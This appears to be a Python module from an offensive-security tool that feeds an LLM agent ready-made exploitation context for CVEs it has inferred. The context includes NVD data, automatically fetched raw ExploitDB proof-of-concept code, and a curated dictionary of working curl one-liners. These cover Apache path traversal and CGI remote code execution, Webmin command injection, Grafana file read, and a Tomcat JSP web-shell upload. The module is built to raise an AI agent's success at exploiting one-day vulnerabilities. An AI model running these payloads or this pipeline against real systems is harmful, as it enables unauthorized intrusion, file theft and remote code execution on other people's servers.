"""CVE exploitation-context injector — the one-day "87% recipe" as a
deterministic pre-LLM injection.

Empirical basis (Fang & Kang, arXiv 2404.08144, *LLM Agents can Autonomously
Exploit One-day Vulnerabilities*): a ReAct agent given the **CVE description**
exploited 87% of a real one-day set; WITHOUT the description, only 7%. The
description supplies the *what* and *where*; the model only has to build the
exploitation chain.

Kryon already produces ``inferred`` version→CVE findings (``cli/version_cve``)
and can enrich a CVE with its NVD description + references + ExploitDB PoCs +
EPSS + CISA-KEV (``intelligence/cve_enrichment.CVEEnricher``). Those two were
never connected: the model saw *"CVE-XXXX applies"* (the 7% condition) but never
the description (the 87% condition). This module bridges them, rendering an
authoritative "one-day exploitation context" block that the deterministic phase
appends to the turn input — the same injection mechanism as
``engine_phase.format_engine_ground_truth``.

Design mirrors ``intelligence/source_review``: pure/testable orchestration
(extract → enrich → format) with the network-touching enricher behind an
injectable interface so unit tests never hit NVD.

Banca-safe: gated OFF by default (``KRYON_CVE_EXPLOIT_CONTEXT``). The enrichment
itself is read-only (NVD/EPSS/KEV/ExploitDB lookups), but the offensive framing
("here is how to exploit") is opt-in — auto-on only under an active offensive
profile (``KRYON_RED_TEAM`` / ``KRYON_CAPABLE_MODEL``). The finding stays
``inferred``; this only hands the model the context to *attempt* confirmation.
"""

from __future__ import annotations

import logging
import os
import re
from typing import Any, Protocol

logger = logging.getLogger(__name__)

# rule_id shape emitted by cli/version_cve.to_findings (h.cve.lower()).
_CVE_RULE_RE = re.compile(r"^cve-\d{4}-\d{3,}$", re.IGNORECASE)
_CVE_ANY_RE = re.compile(r"cve-\d{4}-\d{3,}", re.IGNORECASE)

# Cap how many CVEs we enrich per turn — each is one NVD round-trip, and a huge
# banner sweep should not turn into a 50-request storm before the LLM even runs.
_MAX_CVES_DEFAULT = 6

# Concrete exploitation technique per exploit-backed CVE — the *mechanics* the
# NVD description omits. The one-day bench (Apache 2.4.49) showed the model
# targets the right CVE from the description but fails the payload SYNTAX: it
# used naive `../` (curl normalizes it away → 404) instead of `--path-as-is` +
# `%2e`. This map hands it the exact command. `<TARGET>` is guard-catchable
# (self-correcting if copied literally). Only clean command PoCs — memory-
# corruption CVEs (e.g. regreSSHion) have no one-liner and are omitted.
_EXPLOIT_HINTS: dict[str, str] = {
    "CVE-2021-41773": (
        "# el traversal NECESITA --path-as-is + %2e (curl colapsa ../ y da 404):\n"
        "curl --path-as-is -s 'http://<TARGET>/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'\n"
        "# RCE si mod_cgi/cgi-bin activo:\n"
        "curl --path-as-is -s -d 'echo Content-Type: text/plain; echo; id' "
        "'http://<TARGET>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'"
    ),
    "CVE-2021-42013": (
        "# bypass del fix incompleto de 41773 (doble-encode %32%65):\n"
        "curl --path-as-is -s "
        "'http://<TARGET>/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd'\n"
        "curl --path-as-is -s -d 'echo Content-Type: text/plain; echo; id' "
        "'http://<TARGET>/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'"
    ),
    "CVE-2019-15107": (
        "# Webmin password_change.cgi unauth RCE (command injection en new pass):\n"
        "curl -s -k 'https://<TARGET>/password_change.cgi' "
        "--data 'user=root&pam=&expired=2&old=a&new1=b&new2=b|id' "
        "-H 'Referer: https://<TARGET>/session_login.cgi' -H 'Cookie: redirect=1; testing=1'"
    ),
    "CVE-2021-43798": (
        "# Grafana plugin path traversal (file read, sin auth):\n"
        "curl --path-as-is -s "
        "'http://<TARGET>/public/plugins/alertlist/../../../../../../../../etc/passwd'"
    ),
    "CVE-2017-12617": (
        "# Tomcat JSP upload RCE (PUT con readonly=false):\n"
        "curl -s -X PUT 'http://<TARGET>/shell.jsp/' "
        "--data '<% Runtime.getRuntime().exec(request.getParameter(\"c\")); %>'\n"
        "curl -s 'http://<TARGET>/shell.jsp?c=id'"
    ),
    "CVE-2011-2523": (
        "# vsftpd 2.3.4 backdoor: un user terminado en ':)' abre shell en 6200/tcp.\n"
        "# Metasploit: exploit/unix/ftp/vsftpd_234_backdoor (o abrir 6200 manual)."
    ),
}


class _Enricher(Protocol):
    """Minimal async interface satisfied by ``CVEEnricher`` (injectable for tests)."""

    async def enrich(self, cve_id: str) -> Any: ...


def _finding_cve_id(finding: Any) -> str | None:
    """Extract a CVE id from an ``inferred`` finding, else None.

    ``rule_id`` is authoritative (``version_cve`` sets it to the CVE, lowercased);
    ``message`` is a fallback for findings that carry the CVE only in prose.
    """
    level = str(getattr(finding, "verification_level", "") or "").lower()
    if level != "inferred":
        return None
    rule = str(getattr(finding, "rule_id", "") or "").strip()
    if _CVE_RULE_RE.match(rule):
        return rule.upper()
    msg = str(getattr(finding, "message", "") or "")
    m = _CVE_ANY_RE.search(msg)
    return m.group(0).upper() if m else None


def extract_inferred_cves(findings: list, *, limit: int = _MAX_CVES_DEFAULT) -> list[str]:
    """Deduped, order-preserving CVE ids from ``inferred`` findings (pure).

    Only findings whose ``verification_level`` is ``inferred`` qualify — a
    ``confirmed`` finding already has ground-truth evidence and needs no
    exploitation scaffolding.
    """
    seen: set[str] = set()
    out: list[str] = []
    for f in findings or []:
        cve = _finding_cve_id(f)
        if cve and cve not in seen:
            seen.add(cve)
            out.append(cve)
            if len(out) >= limit:
                break
    return out


def _fmt_epss(detail: Any) -> str:
    score = getattr(detail, "epss_score", None)
    pct = getattr(detail, "epss_percentile", None)
    if score is None:
        return ""
    pct_txt = f", percentil {pct:.2f}" if isinstance(pct, (int, float)) else ""
    return f"EPSS {score:.4f}{pct_txt}"


async def _fetch_poc_excerpt(refs: list, *, fetcher=None, max_chars: int = 1400) -> str:
    """Best-effort fetch of the raw ExploitDB PoC text for the first exploit ref.

    Converts ``.../exploits/N`` → ``.../raw/N`` (the plaintext exploit). Returns
    "" on any failure. ``fetcher`` (async ``url -> str``) is injectable so tests
    never hit the network. Used only when no curated ``_EXPLOIT_HINTS`` entry
    exists — the curated hint is more reliable than parsing an arbitrary script.
    """
    edb = next((r for r in (refs or []) if "exploit-db.com/exploits/" in r), "")
    if not edb:
        return ""
    raw_url = edb.replace("/exploits/", "/raw/")
    try:
        if fetcher is not None:
            text = await fetcher(raw_url)
        else:
            import httpx

            async with httpx.AsyncClient(timeout=10, follow_redirects=True) as client:
                resp = await client.get(raw_url, headers={"User-Agent": "Mozilla/5.0"})
                resp.raise_for_status()
                text = resp.text
        return (text or "").strip()[:max_chars]
    except Exception:  # noqa: BLE001 — PoC fetch is best-effort supplement
        return ""


def format_exploitation_context(details: list, poc_by_cve: dict | None = None) -> str:
    """Render enriched CVE details as an authoritative one-day context block (pure).

    Neutral, factual wording — this is read by the model to build the
    exploitation chain, so it must read as ground-truth reference, not as
    internal scaffolding if echoed. Empty details → empty string.

    ``poc_by_cve`` maps ``CVE-id → concrete PoC/technique text``; when present for
    a CVE, its exact command is rendered (the mechanics the NVD description omits).
    """
    poc_by_cve = poc_by_cve or {}
    usable = [d for d in details if getattr(d, "description", "")]
    if not usable:
        return ""

    lines: list[str] = [
        "",
        "---",
        "## Contexto de explotación (one-day) — referencia autoritativa",
        "",
        "Los siguientes CVEs fueron **inferidos** por versión/banner (exposición "
        "no confirmada). La descripción NVD y las referencias de abajo son el "
        "*qué* y *dónde* para intentar **confirmar** cada uno con una prueba "
        "concreta. Si lo confirmás con evidencia real, registralo como hallazgo "
        "verificado; si no, sigue siendo inferido.",
        "",
    ]
    for d in usable:
        cve = getattr(d, "cve_id", "?") or "?"
        head = f"### {cve}"
        cvss = getattr(d, "cvss_score", None)
        if isinstance(cvss, (int, float)):
            vec = getattr(d, "cvss_vector", "") or ""
            head += f"  · CVSS {cvss}" + (f" ({vec})" if vec else "")
        lines.append(head)

        flags: list[str] = []
        if getattr(d, "cisa_kev", False):
            flags.append("**CISA KEV** (explotación activa in-the-wild)")
        epss = _fmt_epss(d)
        if epss:
            flags.append(epss)
        if getattr(d, "exploit_available", False):
            flags.append("exploit público disponible")
        if flags:
            lines.append("· " + " · ".join(flags))

        desc = str(getattr(d, "description", "") or "").strip()
        if desc:
            lines.append(f"\n{desc[:900]}")

        poc = poc_by_cve.get(cve)
        if poc:
            lines.append("\nPoC / técnica de explotación (comando concreto — usá esta sintaxis):")
            lines.append("```")
            lines.append(str(poc)[:1400])
            lines.append("```")

        exploit_refs = [r for r in (getattr(d, "exploit_refs", None) or []) if r][:5]
        if exploit_refs:
            lines.append("\nPoC / exploit:")
            lines.extend(f"  - {r}" for r in exploit_refs)

        refs = [r for r in (getattr(d, "references", None) or []) if r][:5]
        if refs:
            lines.append("Referencias:")
            lines.extend(f"  - {r}" for r in refs)
        lines.append("")

    return "\n".join(lines)


async def build_cve_exploitation_context(
    findings: list,
    *,
    enricher: _Enricher | None = None,
    limit: int = _MAX_CVES_DEFAULT,
    fetch_poc: bool = True,
    poc_fetcher=None,
) -> str:
    """Extract inferred CVEs → enrich (injectable) → attach PoC → format. Never raises.

    Returns "" when there are no inferred CVEs or enrichment yields no
    descriptions. The ``enricher`` defaults to a live ``CVEEnricher``; tests
    pass a stub so no network is touched.

    Each CVE's concrete PoC comes from the curated ``_EXPLOIT_HINTS`` (reliable,
    offline) when present, else a best-effort raw ExploitDB fetch (``fetch_poc``,
    ``poc_fetcher`` injectable) — the mechanics the description alone doesn't give.
    """
    cve_ids = extract_inferred_cves(findings, limit=limit)
    if not cve_ids:
        return ""

    if enricher is None:
        try:
            from kryon.intelligence.cve_enrichment import CVEEnricher

            enricher = CVEEnricher()
        except Exception:  # noqa: BLE001 — enrichment deps missing → skip cleanly
            logger.debug("CVEEnricher unavailable; skipping exploitation context", exc_info=True)
            return ""

    details: list = []
    for cve_id in cve_ids:
        try:
            details.append(await enricher.enrich(cve_id))
        except Exception:  # noqa: BLE001 — one bad lookup must not drop the block
            logger.debug("enrich failed for %s", cve_id, exc_info=True)

    poc_by_cve: dict[str, str] = {}
    for d in details:
        cve = getattr(d, "cve_id", "") or ""
        hint = _EXPLOIT_HINTS.get(cve.upper())
        if hint:
            poc_by_cve[cve] = hint
        elif fetch_poc:
            excerpt = await _fetch_poc_excerpt(getattr(d, "exploit_refs", None) or [], fetcher=poc_fetcher)
            if excerpt:
                poc_by_cve[cve] = excerpt

    return format_exploitation_context(details, poc_by_cve)


def is_cve_exploit_context_enabled() -> bool:
    """Gate: opt-in via ``KRYON_CVE_EXPLOIT_CONTEXT``; auto-on under an active
    offensive profile (``KRYON_RED_TEAM`` / ``KRYON_CAPABLE_MODEL``).

    Default OFF keeps banca-safe/compliance runs byte-identical.
    """
    explicit = os.environ.get("KRYON_CVE_EXPLOIT_CONTEXT", "").strip().lower()
    if explicit in {"1", "true", "yes", "on"}:
        return True
    if explicit in {"0", "false", "no", "off"}:
        return False
    try:
        from kryon.util.env import is_capable_model, is_red_team

        return bool(is_red_team() or is_capable_model())
    except Exception:  # noqa: BLE001
        return False
